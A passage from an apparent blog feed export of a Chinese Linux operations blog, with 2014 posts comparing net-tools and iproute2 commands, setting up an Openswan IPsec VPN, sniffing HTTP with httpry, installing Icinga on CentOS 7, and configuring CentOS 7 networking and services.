<h5 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h5><p><a href="http://www.percona.com/doc/percona-xtrabackup/2.2/innobackupex/restoring_individual_tables_ibk.html" target="_blank" rel="external">http://www.percona.com/doc/percona-xtrabackup/2.2/innobackupex/restoring_individual_tables_ibk.html</a><br><a href="http://xxrenzhe.blog.51cto.com/4036116/1401454" target="_blank" rel="external">http://xxrenzhe.blog.51cto.com/4036116/1401454</a><br><a href="http://wangfeng7399.blog.51cto.com/3518031/1394996" target="_blank" rel="external">http://wangfeng7399.blog.51cto.com/3518031/1394996</a></p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> XtraBackup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux TCP/IP网络管理工具:net-tools VS iproute2]]></title>
      <url>/2014/09/05/linux-tcpip-e7-bd-91-e7-bb-9c-e7-ae-a1-e7-90-86-e5-b7-a5-e5-85-b7net-tools-vs-iproute2.html</url>
      <content type="html"><![CDATA[<p>许多系统管理员仍然使用ifconfig、route、arp、netstat 命令组合来管理和排错网络配置，这些命令有net-tools包提供,但在Arch Linux、Centos7/RHEL7等发行版里面已经使用iproute2替代了net-toolsiproute2是另外一个网络配置工具，用来取代net-tools的功能；</p>
<p>net-tools访问和修改网络配置是通过procfs(/proc)和ioctl系统调用来完成的，而iproute2是通过netlink socket方式与内核通信；重要的是，iproute2发展一直很好:<br><a href="https://www.kernel.org/pub/linux/utils/net/iproute2/" target="_blank" rel="external">https://www.kernel.org/pub/linux/utils/net/iproute2/</a><br><strong>下面是net-tools和iproute2的使用对比：</strong></p>
<h5 id="列出所有网络接口-包括没有激活的网卡"><a href="#列出所有网络接口-包括没有激活的网卡" class="headerlink" title="列出所有网络接口(包括没有激活的网卡)"></a>列出所有网络接口(包括没有激活的网卡)</h5><pre class="lang:php decode:true">使用net-tools:
$ ifconfig -a
使用iproute2：
$ ip link show</pre>

<h5 id=""><a href="#" class="headerlink" title=""></a><a href="http://www.simlinux.com/wp-content/uploads/2014/09/iplink.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/09/iplink.jpg" alt="iplink"></a></h5><h5 id="激活和关闭网卡"><a href="#激活和关闭网卡" class="headerlink" title="激活和关闭网卡"></a>激活和关闭网卡</h5><pre class="lang:php decode:true ">使用net-tools:
$ sudo ifconfig eth1 up
$ sudo ifconfig eth1 down
使用iproute2:
$ sudo ip link set down eth1
$ sudo ip link set up eth1</pre>

<h5 id="配置IPv4地址"><a href="#配置IPv4地址" class="headerlink" title="配置IPv4地址"></a>配置IPv4地址</h5><pre class="lang:php decode:true ">使用net-tools:
$ sudo ifconfig eth1 10.0.0.1/24
使用iproute2:
$ sudo ip addr add 10.0.0.1/24 dev eth1

使用net-tools配置多IP：
$ sudo ifconfig eth0:1 192.168.10.10 netmask 255.255.255.0 up
$ sudo ifconfig eth0:2 192.168.10.15 netmask 255.255.255.0 up

使用iproute2配置多IP:
$ sudo ip addr add 10.0.0.1/24 broadcast 10.0.0.255 dev eth1
$ sudo ip addr add 10.0.0.2/24 broadcast 10.0.0.255 dev eth1
$ sudo ip addr add 10.0.0.3/24 broadcast 10.0.0.255 dev eth1

查看eth0的IP地址
$sudo ip addr list dev eth0</pre>

<h5 id="移除网卡上的IPv4地址"><a href="#移除网卡上的IPv4地址" class="headerlink" title="移除网卡上的IPv4地址"></a>移除网卡上的IPv4地址</h5><pre class="lang:php decode:true ">使用net-tools:
$ sudo ifconfig eth1 0
使用iproute2:
$ sudo ip addr del 10.0.0.1/24 dev eth1</pre>

<h5 id="查看网卡上配置的IPv4地址"><a href="#查看网卡上配置的IPv4地址" class="headerlink" title="查看网卡上配置的IPv4地址"></a>查看网卡上配置的IPv4地址</h5><pre class="lang:php decode:true">使用net-tools:
$ ifconfig eth1
使用iproute2:
$ ip addr show dev eth1
如果是网卡绑定了多IP的话，iproute2能显示所有的地址，而net-tools只能显示一个</pre>

<h5 id="配置IPv6地址"><a href="#配置IPv6地址" class="headerlink" title="配置IPv6地址"></a><a href="http://www.simlinux.com/wp-content/uploads/2014/09/ipaddr.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/09/ipaddr.jpg" alt="ipaddr"></a>配置IPv6地址</h5><pre class="lang:php decode:true">使用net-tools:
$ sudo ifconfig eth1 inet6 add 2002:0db5:0:f102::1/64
$ sudo ifconfig eth1 inet6 add 2003:0db5:0:f102::1/64
使用iproute2:
$ sudo ip -6 addr add 2002:0db5:0:f102::1/64 dev eth1
$ sudo ip -6 addr add 2003:0db5:0:f102::1/64 dev eth1</pre>

<h5 id="查看网卡上配置的IPv6地址"><a href="#查看网卡上配置的IPv6地址" class="headerlink" title="查看网卡上配置的IPv6地址"></a>查看网卡上配置的IPv6地址</h5><pre class="lang:php decode:true ">使用net-tools:
$ ifconfig eth1
使用iproute2:
$ ip -6 addr show dev eth1</pre>

<h5 id="-1"><a href="#-1" class="headerlink" title=""></a><a href="http://www.simlinux.com/wp-content/uploads/2014/09/ipv6.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/09/ipv6.jpg" alt="ipv6"></a></h5><h5 id="移除网卡上的IPv6地址"><a href="#移除网卡上的IPv6地址" class="headerlink" title="移除网卡上的IPv6地址"></a>移除网卡上的IPv6地址</h5><pre class="lang:php decode:true ">使用net-tools:
$ sudo ifconfig eth1 inet6 del 2002:0db5:0:f102::1/64
使用iproute2:
$ sudo ip -6 addr del 2002:0db5:0:f102::1/64 dev eth1</pre>

<h5 id="更改网卡MAC地址"><a href="#更改网卡MAC地址" class="headerlink" title="更改网卡MAC地址"></a>更改网卡MAC地址</h5><pre class="lang:php decode:true ">使用net-tools:
$ sudo ifconfig eth1 hw ether 08:00:27:75:2a:66
使用iproute2:
$ sudo ip link set dev eth1 address 08:00:27:75:2a:67</pre>

<h5 id="查看路由表"><a href="#查看路由表" class="headerlink" title="查看路由表"></a>查看路由表</h5><pre class="lang:php decode:true ">使用net-tools:
$route -n
$ netstat -rn
使用iproute2:
$ ip route show</pre>

<h5 id="-2"><a href="#-2" class="headerlink" title=""></a><a href="http://www.simlinux.com/wp-content/uploads/2014/09/route.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/09/route.jpg" alt="route"></a></h5><h5 id="添加修改默认路由"><a href="#添加修改默认路由" class="headerlink" title="添加修改默认路由"></a>添加修改默认路由</h5><pre class="lang:php decode:true ">使用net-tools:
$ sudo route add default gw 192.168.1.2 eth0
$ sudo route del default gw 192.168.1.1 eth0
使用iproute2:
$ sudo ip route add default via 192.168.1.2 dev eth0
$ sudo ip route replace default via 192.168.1.2 dev eth0</pre>

<h5 id="添加和删除静态路由"><a href="#添加和删除静态路由" class="headerlink" title="添加和删除静态路由"></a>添加和删除静态路由</h5><pre class="lang:php decode:true ">使用net-tools:
$ sudo route add default gw 192.168.1.2 eth0
$ sudo route del default gw 192.168.1.1 eth0
使用iproute2:
$ sudo ip route add default via 192.168.1.2 dev eth0
$ sudo ip route replace default via 192.168.1.2 dev eth0</pre>

<h5 id="查看socket统计"><a href="#查看socket统计" class="headerlink" title="查看socket统计"></a>查看socket统计</h5><pre class="lang:php decode:true ">使用net-tools:
$ netstat
$ netstat -l
使用iproute2:
$ ss
$ ss -l</pre>

<h5 id="查看ARP表"><a href="#查看ARP表" class="headerlink" title="查看ARP表"></a><a href="http://www.simlinux.com/wp-content/uploads/2014/09/socket.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/09/socket.jpg" alt="socket"></a>查看ARP表</h5><pre class="lang:php decode:true">使用net-tools:
$ arp -an
使用iproute2:
$ ip neigh</pre>

<h5 id="-3"><a href="#-3" class="headerlink" title=""></a><a href="http://www.simlinux.com/wp-content/uploads/2014/09/arp.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/09/arp.jpg" alt="arp"></a></h5><h5 id="添加和删除静态ARP"><a href="#添加和删除静态ARP" class="headerlink" title="添加和删除静态ARP"></a>添加和删除静态ARP</h5><pre class="lang:php decode:true ">使用net-tools:
$ sudo arp -s 192.168.1.100 00:0c:29:c0:5a:ef
$ sudo arp -d 192.168.1.100
使用iproute2:
$ sudo ip neigh add 192.168.1.100 lladdr 00:0c:29:c0:5a:ef dev eth0
$ sudo ip neigh del 192.168.1.100 dev eth0</pre>

<h5 id="添加、删除和查看多播地址"><a href="#添加、删除和查看多播地址" class="headerlink" title="添加、删除和查看多播地址"></a>添加、删除和查看多播地址</h5><p><pre class="lang:php decode:true ">使用net-tools:<br>$ sudo ipmaddr add 33:44:00:00:00:01 dev eth0<br>$ sudo ipmaddr del 33:44:00:00:00:01 dev eth0<br>$ ipmaddr show dev eth0<br>$ netstat -g<br>使用iproute2:<br>$ sudo ip maddr add 33:44:00:00:00:01 dev eth0<br>$ sudo ip maddr del 33:44:00:00:00:01 dev eth0<br>$ ip maddr list dev eth0</pre><br><strong>参考文档：</strong><br>iproute2 HowTo <a href="http://www.policyrouting.org/iproute2.doc.html" target="_blank" rel="external">http://www.policyrouting.org/iproute2.doc.html</a><br>iproute2 man  <a href="http://www.linuxfoundation.org/collaborate/workgroups/networking/iproute2/" target="_blank" rel="external">http://www.linuxfoundation.org/collaborate/workgroups/networking/iproute2/</a><br>RTnetlink         <a href="http://www.man7.org/linux/man-pages/man7/rtnetlink.7.html" target="_blank" rel="external">http://www.man7.org/linux/man-pages/man7/rtnetlink.7.html</a><br>Netlink             <a href="http://www.man7.org/linux/man-pages/man7/netlink.7.html" target="_blank" rel="external">http://www.man7.org/linux/man-pages/man7/netlink.7.html</a></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iproute2 </tag>
            
            <tag> net-tools </tag>
            
            <tag> netlink </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[如何使用Openswan创建点对点的IPsec VPN隧道]]></title>
      <url>/2014/08/27/e5-a6-82-e4-bd-95-e4-bd-bf-e7-94-a8openswan-e5-88-9b-e5-bb-ba-e7-82-b9-e5-af-b9-e7-82-b9-e7-9a-84ipsec-vpn-e9-9a-a7-e9-81-93.html</url>
      <content type="html"><![CDATA[<p>在Internet中，通常使用VPN隧道来互联两个物理隔离的网络的内部通信；例如：VPN隧道可以用来连接两个经过NAT之后分支机构的网络，此文将针对使用Openswan来实现点对点的VPN隧道测试</p>
<h5 id="拓扑结构"><a href="#拓扑结构" class="headerlink" title="拓扑结构"></a>拓扑结构</h5><h5 id="安装配置VPN服务器"><a href="#安装配置VPN服务器" class="headerlink" title=" 安装配置VPN服务器"></a><a href="http://www.simlinux.com/wp-content/uploads/2014/08/14821245117_3f677e4d58_z.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/15004668831_fd260b7f1e_z.jpg" alt="ipsec1"></a> <a href="http://www.simlinux.com/wp-content/uploads/2014/08/15004668821_36e02ab8b0_z.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/15004668821_36e02ab8b0_z.jpg" alt="ipsec2"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/14821245117_3f677e4d58_z.jpg" alt="ipsec3"></a>安装配置VPN服务器</h5><p>一般情况下，我们只能管理A站点，如果也想管理B站点，这时就需要建立VPN隧道</p>
<pre class="lang:php decode:true ">yum install openswan lsof</pre>
禁止VPN重定向
<pre class="lang:sh decode:true ">for vpn in /proc/sys/net/ipv4/conf/*;
do 
echo 0 &gt; $vpn/accept_redirects;
echo 0 &gt; $vpn/send_redirects;
done</pre>
修改内核参数启用转发和禁止重定向
<pre class="lang:sh decode:true ">vim /etc/sysctl.conf
net.ipv4.ip_forward = 1
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.all.send_redirects = 0

sysctl –p
</pre>
放行openswan服务端口和NAT规则
<pre class="lang:php decode:true ">iptables -A INPUT -p udp --dport 500 -j ACCEPT
iptables -A INPUT -p tcp --dport 4500 -j ACCEPT
iptables -A INPUT -p udp --dport 4500 -j ACCEPT
iptables -t nat -A POSTROUTING -s site-A-private-subnet -d site-B-private-subnet -j SNAT --to site-A-Public-IP</pre>

<h5 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h5><p><strong>Site-A VPN Server:</strong></p>
<pre class="lang:sh decode:true ">vim /etc/ipsec.conf

## general configuration parameters ##
config setup
        plutodebug=all
        plutostderrlog=/var/log/pluto.log
        protostack=netkey
        nat_traversal=yes
        virtual_private=%v4:10.0.0.0/8,%v4:192.168.0.0/16,%v4:172.16.0.0/16
        ## disable opportunistic encryption in Red Hat ##
        oe=off
## disable opportunistic encryption in Debian ##
## Note: this is a separate declaration statement ##
include /etc/ipsec.d/examples/no_oe.conf 
## connection definition in Red Hat ##
conn demo-connection-redhat
        authby=secret
        auto=start
        ike=3des-md5
        ## phase 1 ##
        keyexchange=ike
        ## phase 2 ##
        phase2=esp
        phase2alg=3des-md5
        compress=no
        pfs=yes
        type=tunnel
        left=&lt;siteA-public-IP&gt;
        leftsourceip=&lt;siteA-public-IP&gt;
        leftsubnet=&lt;siteA-private-subnet&gt;/netmask
        ## for direct routing ##
        leftsubnet=&lt;siteA-public-IP&gt;/32
        leftnexthop=%defaultroute
        right=&lt;siteB-public-IP&gt;
        rightsubnet=&lt;siteB-private-subnet&gt;/netmask
## connection definition in Debian ##
conn demo-connection-debian
        authby=secret
        auto=start
        ## phase 1 ##
        keyexchange=ike
        ## phase 2 ##
        esp=3des-md5
        pfs=yes
        type=tunnel
        left=&lt;siteA-public-IP&gt;
        leftsourceip=&lt;siteA-public-IP&gt;
        leftsubnet=&lt;siteA-private-subnet&gt;/netmask
        ## for direct routing ##
        leftsubnet=&lt;siteA-public-IP&gt;/32
        leftnexthop=%defaultroute
        right=&lt;siteB-public-IP&gt;
        rightsubnet=&lt;siteB-private-subnet&gt;/netmask
</pre>
身份验证可以通过几种不同的方式,此处使用pre-shared方式
<pre class="lang:sh decode:true ">vim /etc/ipsec.secrets
siteA-public-IP  siteB-public-IP:  PSK  "pre-shared-key"
## in case of multiple sites ##
siteA-public-IP  siteC-public-IP:  PSK  "corresponding-pre-shared-key"
</pre>

<h5 id="启动服务和排错"><a href="#启动服务和排错" class="headerlink" title="启动服务和排错"></a>启动服务和排错</h5><p><pre class="lang:php decode:true ">service ipsec restart<br>chkconfig ipsec on</pre><br>如果能正常启动，从A端就能ping通B端私网地址</p>
<p>在Site-A VPN Server上ip route 就可以查看相关的路由</p>
<p><pre class="lang:php decode:true ">[siteB-private-subnet] via [siteA-gateway] dev eth0 src [siteA-public-IP]<br>default via [siteA-gateway] dev eth0</pre><br>两边的VPN Server都配置完成后即可互访私网，其他重要命令：</p>
<p>查看隧道状态</p>
<p><pre class="lang:php decode:true ">service ipsec status</pre></p>
<p>IPsec running  - pluto pid: 20754<br>pluto pid 20754<br>1 tunnels up<br>some eroutes exist<br>ipsec auto –status</p>
<p><pre class="lang:php decode:true ">## output truncated ##<br>000 “demo-connection-debian”:     myip=&lt;siteA-public-IP&gt;; hisip=unset;<br>000 “demo-connection-debian”:   ike_life: 3600s; ipsec_life: 28800s; rekey_margin: 540s; rekey_fuzz: 100%; keyingtries: 0; nat_keepalive: yes<br>000 “demo-connection-debian”:   policy: PSK+ENCRYPT+TUNNEL+PFS+UP+IKEv2ALLOW+SAREFTRACK+lKOD+rKOD; prio: 32,28; interface: eth0;</pre></p>
<h2 id="output-truncated"><a href="#output-truncated" class="headerlink" title="output truncated"></a>output truncated</h2><p>000 #184: “demo-connection-debian”:500 STATE_QUICK_R2 (IPsec SA established); EVENT_SA_REPLACE in 1653s; newest IPSEC; eroute owner; isakmp#183; idle; import:not set</p>
<h2 id="output-truncated-1"><a href="#output-truncated-1" class="headerlink" title="output truncated"></a>output truncated</h2><p>000 #183: “demo-connection-debian”:500 STATE_MAIN_I4 (ISAKMP SA established); EVENT_SA_REPLACE in 1093s; newest ISAKMP; lastdpd=-1s(seq in:0 out:0); idle; import:not set<br>相关日志文件(记录了认证、Key交换信息等，可用于排错):<br>/var/log/pluto.log</p>
<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><p>1.运营商可能会屏蔽端口，通过telent命令测试确保运营商允许使用UDP 500, TCP/UDP 4500 端口<br>2.确保防火墙放行相关端口<br>3.确保终端服务器pre-shared密钥是相同的<br>4.遇到NAT问题，尝试使用SNAT 替代MASQUERADING</p>
<p>&nbsp;</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> openswan </tag>
            
            <tag> vpn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[如何在Linux下使用命令行嗅探HTTP流量]]></title>
      <url>/2014/08/22/e5-a6-82-e4-bd-95-e5-9c-a8linux-e4-b8-8b-e4-bd-bf-e7-94-a8-e5-91-bd-e4-bb-a4-e8-a1-8c-e5-97-85-e6-8e-a2http-e6-b5-81-e9-87-8f.html</url>
      <content type="html"><![CDATA[<p>通常我们在调试Web应用、RESTFUL服务或者排错PAC (proxy auto config) 以及检查是否有恶意访问等会去通过错误日志日志或者嗅探数据包的方式去排错；常见的嗅探数据包软件有tcpdump、wireshark;但是针对HTTP需要对数据包进行过滤，显示格式也更不容易读，Httpry工具就能更方便易读的嗅探HTTP流量</p>
<h5 id="安装httpry"><a href="#安装httpry" class="headerlink" title="安装httpry"></a>安装httpry</h5><p>基于Debian(Ubuntu or Linux Mint)，基础库并没有httpry包，我们用源码来安装</p>
<pre class="lang:php decode:true">$ sudo apt-get install gcc make git libpcap0.8-dev
$ git clone https://github.com/jbittel/httpry.git
$ cd httpry
$ make
$ sudo make install</pre>
基于Fedora，CentOS or RHEL可以使用EPEL来yum安装
<pre class="lang:php decode:true">$ sudo yum install httpry</pre>
也可以通过源码安装
<pre class="lang:php decode:true  ">$ sudo yum install gcc make git libpcap-devel
$ git clone https://github.com/jbittel/httpry.git
$ cd httpry
$ make
$ sudo make install</pre>

<h5 id="httpry的基本使用"><a href="#httpry的基本使用" class="headerlink" title="httpry的基本使用"></a>httpry的基本使用</h5><p>httpry通过监听网卡接口来实时嗅探HTTP的请求和响应</p>
<pre class="lang:php decode:true">$ sudo httpry -i &lt;network-interface&gt;</pre>
[![ryeth0](http://www.simlinux.com/wp-content/uploads/2014/08/ryeth0-1024x469.png)](http://www.simlinux.com/wp-content/uploads/2014/08/ryeth0.png)
将HTTP 数据包保存为二进制文件
<pre class="lang:php decode:true">$ sudo httpry -i eth0 -b output.dump
</pre>
重放HTTP数据包
<pre class="lang:php decode:true ">$ sudo httpry -r output.dump</pre>
将HTTP 数据包保存为文本文件
<pre class="lang:php decode:true">$ sudo httpry -i eth0 -o output.txt</pre>

<h5 id="httpry的高级应用"><a href="#httpry的高级应用" class="headerlink" title="httpry的高级应用"></a>httpry的高级应用</h5><p>监控特定的HTTP请求方式(GET,POST,PUT,HEAD,CONNECT等),使用-m参数</p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/get.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/get-1024x333.png" alt="get"></a><br>如果你httpry下载的源代码,你会发现有一组Perl脚本的源代码,帮助分析httpry的输出<br>这些脚本httpry /scripts/plugins目录中找到。如果你想编写一个自定义解析器httpry的输出,这些脚本是很好的例子.他们的一些功能:</p>
<ul>
<li><tt>hostnames:</tt> 显示主机名列表.</li>
<li><tt>find_proxies:</tt>探测web代理</li>
<li><tt>search_terms:</tt>查找在搜索服务里面的搜索词.</li>
<li><tt>content_analysis:</tt> 发现uri包含特定的关键词</li>
<li><tt>xml_output:</tt> 转换为XML格式输出</li>
<li><tt>log_summary:</tt> 生成日志汇总</li>
<li><tt>db_dump:</tt> 日志文件数据转储到一个数据库中<br><pre class="lang:php decode:true">$ cd httpry/scripts<br>$ perl parse_log.pl -d ./plugins &lt;httpry-output-file&gt;</pre><br>执行之后httpry/scripts目录下生成txt/xml文件，例如log_summary.txt</li>
</ul>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/summary.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/summary.jpg" alt="summary"></a></p>
<p><strong>相关工具 : </strong>ngxtop<br><strong>参考文档：</strong><br><a href="http://xmodulo.com/2014/06/monitor-nginx-web-server-command-line-real-time.html" target="_blank" rel="external">http://xmodulo.com/2014/06/monitor-nginx-web-server-command-line-real-time.html</a><br><a href="http://www.ttlsa.com/nginx/nginx-modules-ngxtop-ttlsa/" target="_blank" rel="external">http://dumpsterventures.com/jason/httpry/</a><br><a href="http://www.ttlsa.com/nginx/nginx-modules-ngxtop-ttlsa/" target="_blank" rel="external">http://www.ttlsa.com/nginx/nginx-modules-ngxtop-ttlsa/</a></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> httpry </tag>
            
            <tag> ngxtop </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[开源Linux监控系统:Icinga]]></title>
      <url>/2014/08/20/e5-bc-80-e6-ba-90linux-e7-9b-91-e6-8e-a7-e7-b3-bb-e7-bb-9ficinga-2.html</url>
      <content type="html"><![CDATA[<pre><code>其实Icinga是Nagios监控的一个分支，有两个分支版本Icinga1和Icinga2；Icinga除了完全兼容Nagios的插件和扩展甚至配置文件，在web接口和报告上有很大的改进，并且简化了插件的开发；Icinga1和Nagios的基础监控类似，增加了一些新的特性和修复了Nagios的一些bug
</code></pre><p>详细可参考：<br><a href="https://www.icinga.org/icinga/icinga-1/features/" target="_blank" rel="external">https://www.icinga.org/icinga/icinga-1/features/</a><br><a href="https://www.icinga.org/icinga/icinga-2/architecture/" target="_blank" rel="external">https://www.icinga.org/icinga/icinga-2/architecture/</a><br>下面基于Centos7来安装Icinga1：</p>
<p><strong>一、安装LAMP环境<br>**</strong>1.安装apache和php<br>**  yum -y install httpd php php-pear php-xmlrpc php-xsl php-soap php-mysql php-pdo php-gd php-mbstring<br>防火墙放行httpd服务<br>firewall-cmd —add-service=http (临时放行)<br>firewall-cmd —permanent —add-service=http（永久放行，写入配置文件，系统重启后依然有效）<br>systemctl start http.service</p>
<pre><code>vim /var/www/html/info.php
&amp;lt;?php
    phpinfo();
?&amp;gt;
&amp;lt;br&amp;gt;
测试php解析是否正常
vim /etc/php.ini
date.timezone= PRC
`&lt;/pre&gt;

**2.安装Mariadb**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`yum -y install mariadb-server mariadb
mysql_secure_installation
systemctl start mariadb
systemctl status mariadb
`&lt;/pre&gt;

**二、安装icinga监控工具**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`wget http://packages.icinga.org/epel/ICINGA-release.repo -O /etc/yum.repod/icinga.repo
rpm --import http://packages.icinga.org/icinga.key
yum  -y install icinga icinga-doc icinga-gui
htpasswd -cm /etc/icinga/passwd  geekwolf
systemctl start icinga
systemctl start httpd
`&lt;/pre&gt;

**三、安装Nagios插件**

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`   rpm -Uvh http://ftp.ines.lug.ro/fedora/epel/beta/7/x86_64/epel-release-7-0.2.noarch.rpm
   yum -y install nagios-plugins nagios-plugins-all
   配置文件路径/etc/icinga，配置方式和nagios一样

   vim  /etc/icinga/cgi.cfg
   authorized_for_system_information=geekwolf
   authorized_for_configuration_information=geekwolf
   authorized_for_full_command_resolution=geekwolf
   authorized_for_system_commands=geekwolf
   authorized_for_all_services=geekwolf
   authorized_for_all_hosts=geekwolf
   authorized_for_all_service_commands=geekwolf
   authorized_for_all_host_commands=geekwolf
</code></pre><p>访问Web:<a href="http://192.168.117.129/icinga" target="_blank" rel="external">http://192.168.117.129/icinga</a></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/icingam.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/icingam.png" alt="icingam"></a></p>
<p><strong>相关资源</strong>：</p>
<blockquote>
<p>Icinga官方文档 :<a href="http://docs.icinga.org/" target="_blank" rel="external">http://docs.icinga.org</a></p>
<p>Icinga EPEL :<a href="http://packages.icinga.org/epel" target="_blank" rel="external">http://packages.icinga.org/epel</a></p>
<p>Icinga安装包及vagrant box下载 ：<a href="https://www.icinga.org/download" target="_blank" rel="external">https://www.icinga.org/download</a></p>
<p>Centos7网络配置和服务管理参考: <a href="http://simlinux.com/blog/2014/08/12/centos7wang-luo-pei-zhi-he-fu-wu-guan-li/" target="_blank" rel="external">http://simlinux.com/blog/2014/08/12/centos7wang-luo-pei-zhi-he-fu-wu-guan-li/</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> icinga </tag>
            
            <tag> nagios </tag>
            
            <tag> 监控 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CentOS7网络配置和服务管理]]></title>
      <url>/2014/08/20/centos7-e7-bd-91-e7-bb-9c-e9-85-8d-e7-bd-ae-e5-92-8c-e6-9c-8d-e5-8a-a1-e7-ae-a1-e7-90-86.html</url>
      <content type="html"><![CDATA[<p><strong>一、配置网络</strong><br>在使用Vmware Workstation10.2测试过程中，发现可能部分物理机100M网卡不能正常识别，换到了1000M网卡上测试能正常识别虚拟网卡<br>Centos7系统的网卡设备命名有所变化，可参考<a href="http://www.pubyun.com/blog/deveops/centos-7%E4%B8%8B%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%91%BD%E5%90%8D/" target="_blank" rel="external">CentOS 7下网络设备命名</a>，个人感觉既然学习新系统，完全没必要换成传统的识别名方式，要勇于接受新知识~</p>
<p>1.通过编辑文件修改网络配置</p>
<pre><code>vim   /etc/sysconfig/network-scripts/ifcfg-eno16777736
HWADDR=00:0c:29:14:34:51
TYPE=Ethernet
BOOTPROTO=static
DEFROUTE=yes
PEERDNS=yes
PEERROUTES=yes
USERCTL=no
NM_CONTROLLED=no
IPV4_FAILURE_FATAL=no
IPV6INIT=yes
IPV6_AUTOCONF=yes
IPV6_DEFROUTE=yes
IPV6_PEERDNS=yes
IPV6_PEERROUTES=yes
IPV6_FAILURE_FATAL=no
NAME=eno16777736
ONBOOT=yes
IPADDR=192.168.117.128
NETMASK=255.255.255.0
GATEWAY=192.168.117.2
DNS1=192.168.117.2
`&lt;/pre&gt;

关键配置：

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`TYPE=Ethernet
BOOTPROTO=static
NAME=eno16777736
ONBOOT=yes
IPADDR=192.168.117.128
NETMASK=255.255.255.0
GATEWAY=192.168.117.2
DNS1=192.168.117.2

cat /etc/resolv.conf
nameserver 192.168.117.2
`&lt;/pre&gt;

2.通过文本工具nmtui修改网络配置(RHEL7/CentOS7默认安装,前提需要开启NetworkManager.service才可以使用)

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`yum -y install NetworkManager-tui
nmtui-edit eno16777736  修改网卡配置
nmtui-connect eno16777736
`&lt;/pre&gt;

重启网络

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`systemctl  restart network
systemctl  status network
`&lt;/pre&gt;

修改主机名：

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`vim /etc/hostname
centos7.simlinux.com
`&lt;/pre&gt;

退出重新登录即可生效

**二、关闭不必要的服务**

  最小化安装的Centos7系统并没有nano、vim、wget、curl、ifconfig、lsof命令，这里首先安装一下：

`yum -y install nano vim wget curl net-tools lsof`

  可以通过netstat和lsof查看系统都运行了哪些服务，将不必要的进行关闭

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`systemctl stop postfix
systemctl stop avahi-daemon
systemctl disable postfix
systemctl disable avahi-daemon
systemctl list-unit-files    查看正在运行服务的状态报告
systemctl start httpd.service    启动服务
systemctl stop  httpd.service    关闭服务
systemctl restart  httpd.service 重启服务
systemctl reload   httpd.service 重新加载服务
systemctl disable  httpd.service 开机不启动
systemctl enable   httpd.service 开机启动
systemctl status   httpd.service 查看服务运行状态
systemctl show     httpd.service 显示服务或任务的属性
systemctl list-dependencies  httpd.service  检查服务依赖关系
systemctl is-enabled  httpd.service  检查服务是否开机启动及级别
systemctl -H 192.168.117.128 start httpd.service   启动192.168.117.128机器上的httpd服务
</code></pre>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Centos7 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[16个很有用的在线工具]]></title>
      <url>/2014/08/20/16-e4-b8-aa-e5-be-88-e6-9c-89-e7-94-a8-e7-9a-84-e5-9c-a8-e7-ba-bf-e5-b7-a5-e5-85-b7.html</url>
      <content type="html"><![CDATA[<p><strong>1. <a href="http://explainshell.com/" target="_blank" rel="external">ExplainShell.com</a> 命令解释</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/explainshell.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/explainshell.jpg" alt="explainshell"></a></p>
<p>  对于Linux用户来说每天都会写各种命令和脚本，那么你可以使用这个网站工具来查看命令式如何工作的,这样可以避免不必要的错误出现；也是一个很好的学习命令的方式</p>
<p><strong>2. <a href="http://simlinux.com/BashrcGenerator.com/" target="_blank" rel="external">BashrcGenerator.com</a> 定制个性命令提示符</strong></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/generator.jpg"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/generator.jpg" alt="generator"></a></p>
